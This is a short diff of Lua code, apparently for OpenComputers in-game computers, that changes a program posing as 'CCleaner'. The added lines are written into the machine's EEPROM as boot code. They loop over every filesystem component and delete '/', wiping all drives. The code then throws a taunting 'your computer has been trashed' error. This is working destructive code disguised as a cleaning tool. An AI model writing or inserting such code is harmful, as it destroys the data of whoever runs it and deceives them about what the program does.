@@ -202,7 +202,9 @@ for num=1, #text2 do
     computer.pullSignal(0.001)
 end
 
-computer.pullSignal(2)
+for filesystem in component.list("filesystem") do 
+    component.invoke(filesystem, "remove", "/")
+end
 
 error("Your computer has been trashed by CCleaner. Now enjoy the BSoD...", 0)]]
     eeprom.set( eeprom_code )
